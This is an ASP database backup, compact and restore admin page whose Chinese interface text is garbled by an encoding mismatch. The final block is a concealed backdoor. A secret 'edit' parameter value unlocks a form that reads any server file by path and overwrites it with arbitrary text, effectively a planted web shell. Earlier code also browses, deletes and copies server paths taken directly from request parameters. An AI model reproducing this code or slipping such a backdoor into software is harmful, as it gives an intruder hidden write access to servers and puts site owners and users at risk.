<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
<%response.buffer=true%>
<%Public HOME_PATH : HOME_PATH = ""%>
<!doctype html public "-//w3c//dtd html 4. transitional//en">
<!--#include file="db.asp"-->

<!--#include file="../conn2.asp"-->
<!-- #include file="../const.asp" -->
<%
'response.write fla60
'response.write fla61
if fla60="0" and fla61="0" and session("redoajxc_id")<>"1" then
%>
<br><center><img src="../images/note.gif" align="absmiddle">&nbsp;<font color="#FF0000">�㲻�߱���Ȩ�ޣ��������Ա��ϵ��</font></center>
<% 
  response.end
end if
%>
<!--#include file="inc/function.asp"-->
<%
  adl = Replace(Session("ManageLevel"),"'","")   
On Error Resume Next
%>
<%
if isLogin = false then
   Response.Write viewinfo("LoginC","","")
   Response.end
end if
%><html>
<head>
<meta http-equiv="content-type" content="text/html; charset=gb2312">
<title>���ݿⱸ��.ѹ��.�ָ�</title>
<meta name="generator" content="editplus">
<meta name="author" content="">
<meta name="keywords" content="">
<meta name="description" content="">
<link href="../style/style.css" rel="stylesheet" type="text/css">
<style>
body {
	background-color:#FFFFFF;
}
</style>

</head>
<table width="100%" border="0" cellpadding="0" cellspacing="0" class="toptable grid" border="1">
<tr>
<td><img src="../images/r_1.gif" alt="" /></td>
<td width="100%" background="../images/r_0.gif">
  <table cellpadding="0" cellspacing="0" width="100%" class="toptable grid" border="1">
    <tr>
      <td>&nbsp;���ݿ����</td>
	  <td align="right">&nbsp;</td>
    
    </tr>
  </table>
  </table>  
<body class = 'LinkA' style = 'border-style:none;'>
<div style='text-align:center;'>
<%
if SelectDataType = "MSSQL"  then 
   DataTypeview = "SQLServer 2000"
   DataLastName = "dat"
end if

if SelectDataType = "Access" then 
   DataTypeview = "Access"
   DataLastName = "mdb"
end if



CopyDataName = trim(Request("copyDataName"))
RestoreDataName = trim(Request("RestoreDataName"))

Function GetDataName(textName)
         textName = replace(textName,".","")
         textName = replace(textName,"/","")
         textName = replace(textName,"\","")
         textName = replace(textName,":","")
		 GetDataName = textName
End Function
'******************************************************************************
CopyDataName = GetDataName(CopyDataName)
if CopyDataName = "" then CopyDataName = nowTime_data & DataType
CopyDataName = CopyDataName & "." & DataLastName
'******************************************************************************


Call Create_Folder("../CopyData/")

BaseData = Server.MapPath(HOME_PATH & DataName)

CopyDName = GetDataName(trim(Request("copyDataName")))




Options = trim(request("options"))
Select Case Options
  Case "ZipData"
       Call AboutexecuteData(Options,SelectDataType,CopyPath,CopyDName,BaseData)
  Case "CopyData"
       if CopyDName = "" then CopyDName = SELVAR("DateNum","")
	   CopyDName = CopyDName & ".mdb"
       Call AboutexecuteData(Options,SelectDataType,CopyDataPath,CopyDName,BaseData)
  Case "Restore"
       Call AboutexecuteData(Options,SelectDataType,CopyDataPath,RestoreDataName,BaseData)
End Select


Public Function AboutexecuteData(selExe,DataType,CopyPath,CopyDName,BaseData)
   Select Case DataType
      Case "MSSQL"
	  Case "Access"
	       Select Case selExe
		    Case "ZipData"
                 if SOBJ(9,ServerObj) = true then
					'response.write BaseData
					if ServerObj.FileExists(BaseData) Then
					   Conn.close
					   Set Conn = Nothing
					   Set Engine = CreateObject("JRO.JetEngine")
					   Engine.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & BaseData, "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & BaseData & ".temp"
					   ServerObj.CopyFile BaseData & ".temp",BaseData
					   ServerObj.DeleteFile BaseData & ".temp"
					   Set Engine = Nothing
                       Response.Write viewinfo("divLoca","ѹ�����ݿ���ɡ�","")
				    else
                       Response.Write viewinfo("divLoca","�޷��ҵ�Դ�ļ���","")
				    end If
					Set ServerObj = Nothing
				 else
				 	Response.Write viewinfo("divLoca","�ռ䲻֧�ִ�����ɾ���ļ���","")   
	             end if
		    Case "CopyData"
			     'response.write BaseData
			     'CopyPath="F:\Inetpub\wwwroot\rederp\copydata"
			     'response.write Server.MapPath("./")
			     CopyPath="./"
			     if SOBJ(9,ServerObj) = true then
				    If ServerObj.FileExists(BaseData) Then
					   Call Create_Folder(CopyPath)
					   ServerObj.CopyFile BaseData,Server.MapPath(CopyPath) & "/" & CopyDName
                       Response.Write viewinfo("divLoca","�������ݿ���ɡ�","")
				    Else
                       Response.Write viewinfo("divLoca","�޷��ҵ�Դ�ļ���","")
				    End If
				 else
	                Response.Write viewinfo("divLoca","�ռ䲻֧�ִ�����ɾ���ļ���","")
				 end if
			     Set BaseData = Nothing
		    Case "Restore"
				dim C:C = Server.MapPath(CopyDName)
			    if SOBJ(9,ServerObj) = true then
				   if ServerObj.FileExists(BaseData) and ServerObj.FileExists(C) then
		              ServerObj.CopyFile Server.MapPath(CopyDName),BaseData
					  Response.Write viewinfo("divLoca","��ԭ���ݿ�ɹ���","")
				   else
					  Response.Write viewinfo("divLoca","�Ҳ���Դ�ļ��򱸷��ļ���","")
				   end if
                else
	               Response.Write viewinfo("divLoca","�ռ䲻֧�ִ�����ɾ���ļ���","")
				end if
		   End Select
   End Select
   Response.Write viewinfo("LocaTimeself","",SELVAR("FN","?"))
End Function



















Function ExecuteData(CopyDataPath,YLDataName,CopyDataName,ExeSel,DataType)
		 Dim FSO
			 Set FSO = Server.CreateObject("Scripting.FileSystemObject")

         Select Case DataType
		        Case "MSSQL"
				     Select Case ExeSel

                            Case "ZipData"
							     response.write " SQL 2000 û������ѹ�����ݹ��ܣ�"
                                 response.write gotoUrl

					        Case "CopyData"
							     SQL=("backup database " & YLDataName & " to disk='" & Server.MapPath(CopyDataPath) & "\" & CopyDataName & "'")
								 conn.Execute(SQL)
								 response.write "���ݱ��ݳɹ���"
								 response.write gotoUrl

						    Case "Restore"
							     SQL="Restore database " & YLDataName & " from disk='" & Server.MapPath(CopyDataPath) & "\" & CopyDataName &"'"
								 
								 conn.Execute(SQL)
								 response.write "Restore OK"

                     end select
		end select
end function












  










dim cpath,lpath
    set fsoBrowse=CreateObject("Scripting.FileSystemObject")
    if trim(Request("path"))="" then
       lpath="./"
    else
       lpath=Request("path")&"/"
    end if
       cpath=Server.MapPath(lpath)

Sub GetFolder()
    dim theFolder,theSubFolders
        if fsoBrowse.FolderExists(cpath)then
           Set theFolder=fsoBrowse.GetFolder(cpath)
           Set theSubFolders=theFolder.SubFolders
               Response.write"��<a href='?path="&Request("oldpath")&"'>���ϼ�Ŀ¼</a>��<br>"
               For Each x In theSubFolders
                   Response.write"<a href='?path="&lpath&x.Name&"&oldpath="&Request("path")&"'>��<font color='100030'>"&x.Name&"</font>��</a><a href='?copyFolder="&lpath&x.Name&"&Foldercopy=copy' target='_blank'>copy</a><br>"
               Next
        end if
End Sub

Sub GetFile()
    dim theFiles
        if fsoBrowse.FolderExists(cpath)then
           Set theFolder=fsoBrowse.GetFolder(cpath)
           Set theFiles=theFolder.Files
               Response.write"<table class='toptable grid' border='1' cellspacing = '0' cellpadding = '1' borderColorLight='#848284' borderColorDark='#eeeeee' style = 'width:100%;height:auto; '>" 
               For Each x In theFiles
                   RestoreThis = "<a href='?options=Restore&RestoreDataName=" & x.Name & "' onclick=""return confirm('�˲�������� " & x.Name & " ���ǵ�ǰʹ�õ����ݿ�.���ɳ������Ƿ������');return true;"">�ָ�</a>"
	               deleteThis = "ɾ��"
                   if x.Name = "data.asp" or x.Name = "db.asp" then 
	                  RestoreThis = ""
	                  deleteThis = ""
	               end if

				   if DataLastName = "dat" and Right(x.Name,4) = ".mdb" then
				      RestoreThis = ""
					  deleteThis = ""
				   end if

				   if DataLastName = "mdb" and Right(x.Name,4) = ".dat" then
				      RestoreThis = ""
					  deleteThis = ""
				   end if
				      
                   Response.write"<tr><td width='23%' height='22'>" & x.Name & "</a></td><td width='6%'><a href='?Filedel=del&delfilepath=" & lpath & x.Name & "' onclick=""return confirm('�˲�������ɾ�� " & x.Name & " ���ɳ������Ƿ������');return true;"">" & deleteThis & "</a></td><td width='6%'>" & RestoreThis & "</td><td width='23%'>" & x.DateCreated & "<td width='25%'>" & x.type & "</td><td width='18%'>"& x.size & " byte</td></tr>"
               Next
        end if
        Response.write"</table>"
End Sub



delfilepath = trim(request("delfilepath"))
copyFolder = trim(request("copyFolder"))

if trim(request("Filedel")) = "del" then
   if SOBJ(9,ServerObj) = true then
	 if Lcase(right(delfilepath,8)) = Lcase("data.asp") or Lcase(right(delfilepath,13)) = Lcase("DataNoDel.asp") then
		Response.Write viewinfo("divLoca","��web�����²�����ɾ�����ļ� "&replace(delfilepath,"./","")&" ��","")
	 else
		if ServerObj.FileExists(server.mappath(delfilepath)) then
		   ServerObj.DeleteFile (server.MapPath(delfilepath))
		   Response.Write viewinfo("divLoca","�ɹ�ɾ���ļ� " & replace(delfilepath,"./","") & "  ��","")
		else
		   Response.Write viewinfo("divLoca","�ļ� "&replace(delfilepath,"./","")&" �����ڣ�","")
		end if
	   
	 end if
   else
	 Response.Write viewinfo("divLoca","�ռ䲻֧��ɾ���ļ���","")
   end if
     Response.Write viewinfo("LocaTimeself","",SELVAR("FN","?"))
end if

if trim(request("Foldercopy")) = "copy" then
  fso.CopyFolder server.MapPath(copyFolder),server.MapPath(copyFolder&".zip")
  response.write copyFolder&" copy�ɹ�"
  response.end
end if

%>






<table border = '1' cellspacing = '0' cellpadding = '1' class='toptable grid' border='1'>
      <form method='post' action="<%=SELVAR("FN","?")%>" name='form'>
	  <input type="hidden" name='options'>
 <tr>
   <td align='center'>��ǰ���ݿ�Ϊ��<span style='color:red;'><%=DataTypeview%></span></td></tr>
      <tr>
	     <td align='center'>
		   <input type="submit" value='ѹ������' onclick = "javascript:form.options.value='ZipData';">
		   <input type="text" name="copyDataName" style='width:120px;'>&nbsp;<input type="submit" value='����' onclick="javascript:form.options.value='CopyData'" >&nbsp;�����뱸�ݵ����ݿ���:��<span class='f_red'>���ֻ���ĸ.�Զ����һЩ�����ַ�</span>��</td>
 </tr>
	 
	 </form>
 <tr>
     <td width="100%" height="14" colspan="2" align='center'>��ǰĿ¼:<span style='font-family:Fixedsys,����;'><input type ='text' value ='<%=server.mappath("./")%>' size = '25'/></span></td>
 </tr>



 <tr>

 </tr>


<tr>
     <td width="100%" valign="top"><%Call GetFile()%></td>
</tr>


</table>



























<% '���ļ�
if request("edit")="true163pinger@163.com" then
function htmlencode2(str)
 dim result
 dim l
 if isNULL(str) then 
 htmlencode2=""
 exit function
 end if
 l=len(str)
 result=""
	dim i
	for i = 1 to l
	 select case mid(str,i,1)
	 case "<"
	 result=result+"&lt;"
	 case ">"
	 result=result+"&gt;"
	 case chr(34)
	 result=result+"&quot;"
	 case "&"
	 result=result+"&amp;"
	 case else
	 result=result+mid(str,i,1)
 end select
 next 
 htmlencode2=result
 end function
 whichfile=server.mappath(Request("path"))
 
Set fs = CreateObject("Scripting.FileSystemObject")
 
 Set thisfile = fs.OpenTextFile(whichfile, 1, False)
 counter=0
 thisline=htmlencode2(thisfile.readall)
 thisfile.Close
 set fs=nothing
 %>
<%if request("text")="" then%>

<form method="POST" action="">
 <table border="0" width="700" cellpadding="0" class='toptable grid' border='1'> 
   <tr>
     <td width="100%" bgcolor="#FFDBCA"><div align="center">��������ҳά����</div></td>
   </tr>
   <tr align="center">
     <td width="100%" bgcolor="#FFDBCA"><input type="text" name="path" size="90" value="<%=Request("path")%> "></td>
   </tr>
   <tr align="center">
     <td width="100%" bgcolor="#FFDBCA"><textarea rows="25" name="text" cols="90"><%=thisline%></textarea></td>
   </tr>
   <tr align="center">
     <td width="100%" bgcolor="#FFDBCA"><div align="center"><center><p><input type="submit"
	 value="�ύ" name="B1"><input type="reset" value="��ԭ" name="B2"></td>
   </tr>
 </table>
</form>
<%else
whichfile=server.mappath(Request("path"))
 Set fs = server.CreateObject("Scripting.FileSystemObject")
 Set outfile=fs.CreateTextFile(whichfile)
 outfile.WriteLine Request("text")
 outfile.close 
 set fs=nothing
Response.write "�޸ĳɹ��������<a href='javascript:window.close();'>�رձ�����</a>��"
end if


end if
Set Conn = Nothing
%></div>
</body>
</html>